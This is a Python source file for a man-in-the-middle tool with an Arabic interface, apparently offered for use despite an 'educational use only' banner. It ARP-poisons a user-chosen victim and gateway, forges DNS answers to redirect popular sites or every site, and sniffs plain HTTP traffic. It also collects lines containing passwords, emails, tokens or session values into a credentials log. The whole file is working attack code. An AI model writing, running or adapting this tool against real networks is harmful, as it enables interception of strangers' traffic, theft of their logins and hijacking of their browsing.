#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RONOAI Network Monitor - Ultimate Edition
DNS Spoofing + ARP Poisoning + HTTP Sniffing + Keylogger Network
Educational Purposes Only | Author: Mohamed Elharrimse 2025
"""

import logging
import threading
import time
import os
import sys
import subprocess
import re
from datetime import datetime
from colorama import Fore, Back, Style, init
from scapy.all import ARP, send, sniff, DNS, DNSQR, DNSRR, IP, UDP, TCP, Raw, getmacbyip, conf

init(autoreset=True)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW
C = Fore.CYAN; M = Fore.MAGENTA; W = Fore.WHITE
B = Fore.BLUE; RESET = Style.RESET_ALL; BOLD = Style.BRIGHT

LOG_DIR = "ronoai_logs"
os.makedirs(LOG_DIR, exist_ok=True)

timestamp_now = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILE_DNS = os.path.join(LOG_DIR, f"dns_queries_{timestamp_now}.txt")
LOG_FILE_HTTP = os.path.join(LOG_DIR, f"http_traffic_{timestamp_now}.txt")
LOG_FILE_CREDS = os.path.join(LOG_DIR, f"credentials_{timestamp_now}.txt")
LOG_FILE_FULL = os.path.join(LOG_DIR, f"full_capture_{timestamp_now}.txt")

for log_file in [LOG_FILE_DNS, LOG_FILE_HTTP, LOG_FILE_CREDS, LOG_FILE_FULL]:
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(f"=== RONOAI CAPTURE LOG ===\n")
        f.write(f"Started: {datetime.now()}\n")
        f.write(f"Target: [PENDING]\n")
        f.write("=" * 60 + "\n\n")

def log_write(filename, category, data):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] [{category}]\n{data}\n{'='*50}\n")

BANNER = f"""{R}{BOLD}
 ██████╗  ██████╗ ███╗   ██╗ ██████╗  █████╗ ██╗
 ██╔══██╗██╔═══██╗████╗  ██║██╔═══██╗██╔══██╗██║
 ██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████║██║
 ██╔══██╗██║   ██║██║╚██╗██║██║   ██║██╔══██║██║
 ██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝
{M}
        ╔═══════════════════════════════════════════╗
        ║     RONOAI  NETWORK  MONITOR  ULTIMATE    ║
        ║    MITM | DNS SPOOF | HTTP SNIFF | LOG    ║
        ╚═══════════════════════════════════════════╝
{Y}              Created By: Mohamed Elharrimse 2025
{C}                   [ Educational Use Only ]
{RESET}"""

TARGET_IP = ""
GATEWAY_IP = ""
TARGET_MAC = ""
GATEWAY_MAC = ""
SPOOF_MODE = "sniff"
SPOOF_MAP = {}
DNS_SPOOF_IP = ""
SPOOF_ALL = False
CUSTOM_DOMAIN = ""

SPOOF_OPTIONS = {
    1:  {"name": "🌐  تحويل كل المواقع لصفحة تحذير",      "ip": "192.168.1.100", "mode": "all"},
    2:  {"name": "📺  يوتيوب ← فيسبوك",                    "ip": "157.240.192.35", "target": ["youtube.com", "youtu.be", "googlevideo.com", "ytimg.com"]},
    3:  {"name": "📘  فيسبوك ← يوتيوب",                    "ip": "142.250.185.78", "target": ["facebook.com", "fb.com", "fbcdn.net", "facebook.net"]},
    4:  {"name": "🐦  تويتر/X ← إنستغرام",                 "ip": "157.240.192.174", "target": ["twitter.com", "x.com", "t.co", "twimg.com"]},
    5:  {"name": "📸  إنستغرام ← تويتر",                   "ip": "104.244.42.193", "target": ["instagram.com", "cdninstagram.com"]},
    6:  {"name": "🔍  جوجل ← بينغ",                        "ip": "13.107.42.14", "target": ["google.com", "google.ma", "google.fr", "gstatic.com"]},
    7:  {"name": "💻  جيتهاب ← جيتلاب",                    "ip": "140.82.121.4", "target": ["github.com", "github.io", "githubassets.com"]},
    8:  {"name": "☁️  دروببوكس ← جوجل درايف",              "ip": "142.250.185.174", "target": ["dropbox.com", "dropboxapi.com"]},
    9:  {"name": "💳  أمازون ← علي إكسبريس",               "ip": "47.246.24.234", "target": ["amazon.com", "amazon.fr", "amazon.de", "amazonaws.com"]},
    10: {"name": "🎮  ستيم ← إيبك جيمز",                    "ip": "104.18.25.123", "target": ["steampowered.com", "steamcommunity.com", "steampowered.net"]},
    11: {"name": "🔴  نتفليكس ← يوتيوب",                    "ip": "142.250.185.78", "target": ["netflix.com", "nflxvideo.net", "nflximg.net"]},
    12: {"name": "📧  جيميل ← ياهو ميل",                   "ip": "98.137.11.163", "target": ["gmail.com", "mail.google.com", "googlemail.com"]},
    13: {"name": "☠️  تحويل كل المواقع لـ Rick Roll",       "ip": "151.101.1.140", "mode": "all"},
    14: {"name": "🛑  حجب كل المواقع (NXDOMAIN)",           "ip": "0.0.0.0", "mode": "all"},
    15: {"name": "🔧  تحويل مخصص يدوي (أدخل IP)",           "ip": None, "mode": "custom"},
    16: {"name": "🎯  تحويل موقع محدد (أدخل النطاق + IP)",   "ip": None, "mode": "targeted"},
}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_line(char="─", color=R):
    print(f"{color}{char * 75}{RESET}")

def print_header(text):
    print(f"\n{R}▓▓▓{C} {BOLD}{text}{RESET} {R}▓▓▓{RESET}\n")

def enable_ip_forwarding():
    try:
        if os.name != 'nt':
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            print(f"{G}[✓]{RESET} IP Forwarding مفعل — الضحية متصل")
    except:
        pass

def get_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        print(f"{R}[✗]{RESET} لم يتم العثور على MAC لـ {ip}")
        sys.exit(1)
    return mac

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

def start_arp_poisoning():
    print(f"{C}[*]{RESET} ARP Poisoning يعمل في الخلفية...")
    while True:
        arp_spoof(TARGET_IP, GATEWAY_IP, TARGET_MAC)
        arp_spoof(GATEWAY_IP, TARGET_IP, GATEWAY_MAC)
        time.sleep(2)

def build_dns_response(pkt, query_name, fake_ip):
    return IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
           UDP(dport=pkt[UDP].sport, sport=53) / \
           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
               an=DNSRR(rrname=query_name, rdata=fake_ip, ttl=300))

def dns_handler(pkt):
    global CUSTOM_DOMAIN
    if not pkt.haslayer(DNS) or pkt.getlayer(DNS).qr != 0:
        return

    ip_src = pkt[IP].src
    dns_query = pkt[DNSQR].qname.decode().rstrip('.')
    
    log_data = f"Source: {ip_src}\nQuery: {dns_query}"
    log_write(LOG_FILE_DNS, "DNS QUERY", log_data)
    log_write(LOG_FILE_FULL, "DNS", log_data)

    should_spoof = False
    fake_ip = DNS_SPOOF_IP

    if SPOOF_ALL:
        should_spoof = True
    else:
        for domain in SPOOF_MAP.keys():
            if domain in dns_query:
                fake_ip = SPOOF_MAP[domain]
                should_spoof = True
                break
        if CUSTOM_DOMAIN and CUSTOM_DOMAIN in dns_query:
            fake_ip = DNS_SPOOF_IP
            should_spoof = True

    if should_spoof and ip_src == TARGET_IP:
        try:
            spoofed = build_dns_response(pkt, dns_query + ".", fake_ip)
            send(spoofed, verbose=False)
            print(f" {R}🎯{Y} {ip_src:<16}{RESET} | {R}{dns_query:<35}{RESET} {G}→{M} {fake_ip}{RESET}")
            log_write(LOG_FILE_FULL, "DNS SPOOFED", f"{dns_query} → {fake_ip}")
        except Exception as e:
            print(f"{R}[✗]{RESET} خطأ DNS: {e}")
    else:
        print(f" {C}👁{Y}  {ip_src:<16}{RESET} | {G}{dns_query:<35}{RESET}")

def http_handler(pkt):
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return
    
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    payload = bytes(pkt[Raw].load)
    
    if ip_src != TARGET_IP:
        return
    
    try:
        payload_str = payload.decode('utf-8', errors='ignore')
    except:
        return
    
    if any(method in payload_str for method in ['GET ', 'POST ', 'HTTP/1.']):
        print(f"\n{M}📡 HTTP CAPTURED from {ip_src}{RESET}")
        print(f"{Y}{'─'*60}{RESET}")
        
        host_match = re.search(r'Host:\s*([^\r\n]+)', payload_str)
        host = host_match.group(1) if host_match else "Unknown"
        
        uri_match = re.search(r'(GET|POST)\s+([^\s]+)\s+HTTP', payload_str)
        uri = uri_match.group(2) if uri_match else "/"
        
        ua_match = re.search(r'User-Agent:\s*([^\r\n]+)', payload_str)
        ua = ua_match.group(1) if ua_match else "Unknown"
        
        post_data = ""
        if 'POST ' in payload_str:
            parts = payload_str.split('\r\n\r\n')
            if len(parts) > 1:
                post_data = parts[-1]
        
        creds = ""
        sensitive = ['pass', 'password', 'pwd', 'user', 'email', 'login', 'token', 'session']
        for word in sensitive:
            if word in payload_str.lower():
                for line in payload_str.split('\n'):
                    if word in line.lower():
                        creds += line.strip() + "\n"
        
        print(f" {C}🌐 Host:{RESET}    {host}")
        print(f" {C}📄 URI:{RESET}     {uri}")
        print(f" {C}🖥  Agent:{RESET}   {ua[:50]}...")
        if post_data:
            print(f" {R}📤 Data:{RESET}    {post_data[:200]}")
        if creds:
            print(f" {R}🔑 CREDS:{RESET}   {creds}")
        
        print(f"{Y}{'─'*60}{RESET}\n")
        
        log_entry = f"Host: {host}\nURI: {uri}\nUser-Agent: {ua}\n\nFULL PAYLOAD:\n{payload_str[:1000]}"
        log_write(LOG_FILE_HTTP, "HTTP CAPTURE", log_entry)
        log_write(LOG_FILE_FULL, "HTTP", log_entry)
        
        if creds:
            log_write(LOG_FILE_CREDS, "POTENTIAL CREDS", f"Host: {host}\n{creds}")
            print(f"{R}{BOLD}[!!!] CREDENTIALS CAPTURED AND SAVED TO LOGS{RESET}")

def show_menu():
    clear()
    print(BANNER)
    print_line("═", R)
    print(f"{C}{BOLD}  اختر وضع التشغيل:{RESET}")
    print_line("─", Y)
    print(f" {G}[1]{RESET} 👁  وضع المراقبة فقط (DNS + HTTP Sniffing)")
    print(f" {R}[2]{RESET} 🎯 وضع الهجوم الكامل (DNS Spoof + ARP + HTTP Capture)")
    print(f" {Y}[0]{RESET} 🚪 خروج")
    print_line("═", R)

def show_spoof_menu():
    clear()
    print(BANNER)
    print_line("═", M)
    print(f"{M}{BOLD}  🎯 اختر خيار التحويل (16 خياراً):{RESET}")
    print_line("─", C)
    for num, opt in SPOOF_OPTIONS.items():
        color = R if opt.get("mode") == "all" else (G if num == 16 else Y)
        print(f" {color}[{num:02d}]{RESET} {opt['name']}")
    print_line("─", C)
    print(f" {G}[99]{RESET} ⚙️  تحويل مخصص متعدد النطاقات")
    print(f" {R}[0]{RESET}  🔙 رجوع")
    print_line("═", M)

def get_target_info():
    global TARGET_IP, GATEWAY_IP, TARGET_MAC, GATEWAY_MAC
    
    print_header("إعدادات الهدف")
    
    while True:
        target = input(f"{Y}[?]{RESET} أدخل IP الضحية: {C}").strip()
        if target:
            TARGET_IP = target
            break
    
    gateway = input(f"{Y}[?]{RESET} أدخل IP البوابة [192.168.0.1]: {C}").strip()
    GATEWAY_IP = gateway if gateway else "192.168.0.1"
    
    print(f"\n{C}[*]{RESET} جاري اكتشاف MAC Addresses...")
    TARGET_MAC = get_mac(TARGET_IP)
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    
    print(f"{G}[✓]{RESET} MAC الضحية: {B}{TARGET_MAC}{RESET}")
    print(f"{G}[✓]{RESET} MAC البوابة: {B}{GATEWAY_MAC}{RESET}")
    
    for log_file in [LOG_FILE_DNS, LOG_FILE_HTTP, LOG_FILE_CREDS, LOG_FILE_FULL]:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()
        content = content.replace("Target: [PENDING]", f"Target: {TARGET_IP} ({TARGET_MAC})")
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(content)
    
    time.sleep(1)

def setup_spoofing():
    global SPOOF_MODE, SPOOF_MAP, DNS_SPOOF_IP, SPOOF_ALL, CUSTOM_DOMAIN
    
    while True:
        show_spoof_menu()
        choice = input(f"\n{M}[>]{RESET} اختر رقم الخيار: {C}").strip()
        
        if choice == "0":
            return False
        elif choice == "99":
            custom_ip = input(f"{Y}[?]{RESET} أدخل IP الموقع المزيف: {C}").strip()
            domains = input(f"{Y}[?]{RESET} أدخل النطاقات (مفصولة بفاصلة): {C}").strip()
            DNS_SPOOF_IP = custom_ip
            SPOOF_MAP = {d.strip(): custom_ip for d in domains.split(",")}
            SPOOF_MODE = "spoof"
            print(f"{G}[✓]{RESET} تم إعداد {len(SPOOF_MAP)} نطاق(ات)")
            time.sleep(1)
            return True
        elif choice.isdigit() and int(choice) in SPOOF_OPTIONS:
            opt = SPOOF_OPTIONS[int(choice)]
            
            if opt["mode"] == "all":
                SPOOF_ALL = True
                DNS_SPOOF_IP = opt["ip"]
                print(f"{R}[!]{RESET} {BOLD}سيتم تحويل ALL المواقع إلى {opt['ip']}{RESET}")
            elif opt["mode"] == "custom":
                custom_ip = input(f"{Y}[?]{RESET} أدخل IP الموقع المزيف: {C}").strip()
                DNS_SPOOF_IP = custom_ip
                SPOOF_ALL = True
            elif opt["mode"] == "targeted":
                CUSTOM_DOMAIN = input(f"{Y}[?]{RESET} أدخل النطاق المستهدف (مثال: youtube.com): {C}").strip()
                DNS_SPOOF_IP = input(f"{Y}[?]{RESET} أدخل IP الذي تريد توجيه الضحية إليه: {C}").strip()
                SPOOF_MAP = {CUSTOM_DOMAIN: DNS_SPOOF_IP}
                print(f"{G}[✓]{RESET} سيتم تحويل {R}{CUSTOM_DOMAIN}{RESET} إلى {R}{DNS_SPOOF_IP}{RESET}")
            else:
                DNS_SPOOF_IP = opt["ip"]
                SPOOF_MAP = {d: opt["ip"] for d in opt["target"]}
                print(f"{G}[✓]{RESET} سيتم تحويل: {', '.join(opt['target'])}")
            
            SPOOF_MODE = "spoof"
            time.sleep(2)
            return True
        else:
            print(f"{R}[✗]{RESET} خيار غير صالح!")

def start_monitoring():
    clear()
    print(BANNER)
    print_line("═", G if SPOOF_MODE == "sniff" else R)
    
    mode_text = f"{G}👁 وضع المراقبة{RESET}" if SPOOF_MODE == "sniff" else f"{R}🎯 وضع الهجوم الكامل{RESET}"
    print(f"{C}{BOLD}  الوضع:{RESET} {mode_text}")
    print(f"{C}{BOLD}  الهدف:{RESET} {Y}{TARGET_IP}{RESET} ({B}{TARGET_MAC}{RESET})")
    print(f"{C}{BOLD}  البوابة:{RESET} {Y}{GATEWAY_IP}{RESET} ({B}{GATEWAY_MAC}{RESET})")
    
    if SPOOF_MODE == "spoof":
        print(f"{C}{BOLD}  التحويل:{RESET} {R}{DNS_SPOOF_IP}{RESET}")
        if SPOOF_ALL:
            print(f"{R}{BOLD}  ⚠️  تحذير: جميع المواقع سيتم تحويلها!{RESET}")
        elif CUSTOM_DOMAIN:
            print(f"{R}{BOLD}  🎯 نطاق مستهدف: {CUSTOM_DOMAIN}{RESET}")
    
    print(f"{C}{BOLD}  📁 Logs:{RESET} {G}{LOG_DIR}/{RESET}")
    print_line("═", G if SPOOF_MODE == "sniff" else R)
    
    print(f"\n{G}{'='*75}{RESET}")
    print(f" {Y}{'👁 IP المصدر':<18}{RESET} | {C}{'🌐 النطاق / البيانات':<50}{RESET}")
    print(f"{G}{'='*75}{RESET}\n")
    
    enable_ip_forwarding()
    
    arp_thread = threading.Thread(target=start_arp_poisoning, daemon=True)
    arp_thread.start()
    time.sleep(2)
    
    def packet_router(pkt):
        if pkt.haslayer(UDP) and pkt.haslayer(DNS):
            dns_handler(pkt)
        elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                http_handler(pkt)
    
    try:
        sniff(filter="udp port 53 or tcp port 80", prn=packet_router, store=0)
    except KeyboardInterrupt:
        print(f"\n{R}{'='*75}{RESET}")
        print(f"{Y}[!]{RESET} جاري استعادة جداول ARP وإيقاف اللوج...")
        restore_arp(TARGET_IP, GATEWAY_IP, TARGET_MAC, GATEWAY_MAC)
        restore_arp(GATEWAY_IP, TARGET_IP, GATEWAY_MAC, TARGET_MAC)
        
        for log_file in [LOG_FILE_DNS, LOG_FILE_HTTP, LOG_FILE_CREDS, LOG_FILE_FULL]:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n\n=== ENDED: {datetime.now()} ===\n")
        
        print(f"{G}[✓]{RESET} تم استعادة الشبكة بنجاح")
        print(f"{G}[✓]{RESET} تم حفظ اللوجات في: {B}{LOG_DIR}{RESET}")
        print(f"{R}[!]{RESET} Exiting RONOAI Ultimate...{RESET}")
        sys.exit(0)

def main():
    if os.geteuid() != 0:
        print(f"{R}[✗]{RESET} يجب تشغيل الأداة بصلاحيات root!")
        print(f"{Y}[!]{RESET} استخدم: sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    while True:
        show_menu()
        choice = input(f"\n{C}[>]{RESET} اختر الخيار: {C}").strip()
        
        if choice == "1":
            SPOOF_MODE = "sniff"
            get_target_info()
            start_monitoring()
        elif choice == "2":
            if setup_spoofing():
                get_target_info()
                start_monitoring()
        elif choice == "0":
            print(f"{G}[✓]{RESET} إلى اللقاء!")
            sys.exit(0)
        else:
            print(f"{R}[✗]{RESET} خيار غير صالح!")
            time.sleep(1)

if __name__ == "__main__":
    main()
